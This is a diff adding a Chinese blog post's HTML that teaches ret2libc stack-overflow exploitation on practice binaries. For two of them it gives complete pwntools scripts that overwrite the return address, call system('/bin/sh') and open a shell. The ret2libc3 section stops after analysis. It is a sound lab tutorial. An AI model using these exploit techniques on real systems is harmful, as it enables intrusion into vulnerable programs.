@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="ret2libc原理ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广">
+<meta name="keywords" content="二进制,栈溢出,Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出之ret2libc">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="ret2libc原理ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/5.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/9.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/10.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/11.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/12.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/13.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/14.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/15.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/16.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/17.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/18.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/19.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/20.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/21.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/22.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/23.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/24.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/25.png">
+<meta property="og:updated_time" content="2019-03-06T15:18:35.456Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈溢出之ret2libc">
+<meta name="twitter:description" content="ret2libc原理ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。 具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>栈溢出之ret2libc</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/08/TAMUctf-Pwn-writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/03/栈溢出之ret2syscall/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回頂部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&text=栈溢出之ret2libc"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&is_video=false&description=栈溢出之ret2libc"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=栈溢出之ret2libc&body=Check out this article: https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&name=栈溢出之ret2libc&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc原理"><span class="toc-number">1.</span> <span class="toc-text">ret2libc原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc1——存在system-、-bin-sh"><span class="toc-number">2.</span> <span class="toc-text">ret2libc1——存在system()、/bin/sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc2——只有system"><span class="toc-number">3.</span> <span class="toc-text">ret2libc2——只有system()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc3——无system-和-bin-sh"><span class="toc-number">4.</span> <span class="toc-text">ret2libc3——无system()和/bin/sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        栈溢出之ret2libc
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-05T14:39:35.000Z" itemprop="datePublished">2019-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Pwn/">Pwn</a>, <a class="tag-link" href="/tags/二进制/">二进制</a>, <a class="tag-link" href="/tags/栈溢出/">栈溢出</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="ret2libc原理"><a href="#ret2libc原理" class="headerlink" title="ret2libc原理"></a>ret2libc原理</h2><p>ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+<p>具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。</p>
+<blockquote>
+<p><strong>payload:</strong> padding1 + address of system() + padding2 + address of “/bin/sh”</p>
+</blockquote>
+<p><img src="/2019/03/05/栈溢出之ret2libc/1.png" alt=""></p>
+<p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p>
+<p><strong>第一个问题——system()地址如何确定？</strong></p>
+<p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p>
+<p><strong>第二个问题——“/bin/sh”字符串地址如何确定？</strong></p>
+<p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
+<p><strong>前提条件</strong></p>
+<p>由前面分析可知，ret2libc这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）。</p>
+<h2 id="ret2libc1——存在system-、-bin-sh"><a href="#ret2libc1——存在system-、-bin-sh" class="headerlink" title="ret2libc1——存在system()、/bin/sh"></a>ret2libc1——存在system()、/bin/sh</h2><p>运行程序，提示应用ret2libc，且用file查看是动态链接文件，和libc有关：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/2.png" alt=""></p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/3.png" alt=""></p>
+<p>查看保护机制，只开启了NX：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/4.png" alt=""></p>
+<p>IDA查看：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/5.png" alt=""></p>
+<p>搜索“/bin/sh”字符串，可通过string窗口或ROPgadget工具查找：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/6.png" alt=""></p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/7.png" alt=""></p>
+<p>或</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/8.png" alt=""></p>
+<p>可知“/bin/sh”字符串所在地址为0x08048720。</p>
+<p>因为要从libc中寻找利用函数，则可以在ida直接查看plt中是否有system()函数，发现是存在有的且地址为0x08048460：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/9.png" alt=""></p>
+<p>至于用户输入的变量v4距函数返回地址的偏移地址的计算如之前所示，结果是一样的为0x70。</p>
+<p>编写payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, libc_system_addr, <span class="string">"6666"</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行getshell：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/10.png" alt=""></p>
+<h2 id="ret2libc2——只有system"><a href="#ret2libc2——只有system" class="headerlink" title="ret2libc2——只有system()"></a>ret2libc2——只有system()</h2><p>运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/11.png" alt=""></p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/12.png" alt=""></p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/13.png" alt=""></p>
+<p>使用IDA打开查看：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/14.png" alt=""></p>
+<p>在string窗口确实找不到“/bin/sh”：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/15.png" alt=""></p>
+<p>在plt中仍可找到system()函数，地址为0x08048490：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/16.png" alt=""></p>
+<p>可以发现与示例1相比，这次不直接提供“/bin/sh”，那就换种思维，多利用一个gadgets，可以在plt中看到有gets()函数，即可以将该gets()函数地址用来踩掉原本程序函数的返回地址，然后通过输入的方式将“/bin/sh”输入进去。换句话说，整个过程分成了两部分，第一部分是将“/bin/sh”读入到内存中；第二部分是执行system()获取shell：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/17.png" alt=""></p>
+<p>其中可知get()函数地址为08048460。</p>
+<p>查看gets()函数，其需要一个可读可写的指针参数，且会返回值：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/18.png" alt=""></p>
+<p>寻找一块可读可写的buffer区，通常会寻找.bss段，使用IDA查看可看到存在buf2[100]数组：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/19.png" alt=""></p>
+<p>明确该.bss段是否可读可写：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/20.png" alt=""></p>
+<p>最后就是payload的构造了。因为在gets()函数完成后需要调用system()函数需要保持堆栈平衡，所以在调用完gets()函数后提升堆栈，这就需要add esp, 4这样的指令但是程序中并没有这样的指令。更换思路，通过使用pop xxx指令也可以完成同样的功能，在程序中找到了pop ebx，ret指令。通过ROPgadget工具查看，发现存在一条符合条件的指令，地址为0x0804841d：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/21.png" alt=""></p>
+<p>编写payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804841d</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">'6666'</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行getshell：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/22.png" alt=""></p>
+<h2 id="ret2libc3——无system-和-bin-sh"><a href="#ret2libc3——无system-和-bin-sh" class="headerlink" title="ret2libc3——无system()和/bin/sh"></a>ret2libc3——无system()和/bin/sh</h2><p>在ret2libc2的基础上，再次将system()函数的地址去掉。此时，我们需要同时找到system())函数地址与”/bin/sh”字符串的地址。</p>
+<p>运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/23.png" alt=""></p>
+<p>IDA打开查看，同样是栈溢出漏洞：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/24.png" alt=""></p>
+<p>在String窗口找不到“/bin/sh”字符串，在Functions窗口中也找不到system()函数：</p>
+<p><img src="/2019/03/05/栈溢出之ret2libc/25.png" alt=""></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2libc" target="_blank" rel="noopener">ret2libc</a></p>
+
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc原理"><span class="toc-number">1.</span> <span class="toc-text">ret2libc原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc1——存在system-、-bin-sh"><span class="toc-number">2.</span> <span class="toc-text">ret2libc1——存在system()、/bin/sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc2——只有system"><span class="toc-number">3.</span> <span class="toc-text">ret2libc2——只有system()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2libc3——无system-和-bin-sh"><span class="toc-number">4.</span> <span class="toc-text">ret2libc3——无system()和/bin/sh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&text=栈溢出之ret2libc"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&is_video=false&description=栈溢出之ret2libc"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=栈溢出之ret2libc&body=Check out this article: https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&title=栈溢出之ret2libc"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/&name=栈溢出之ret2libc&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回頂部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
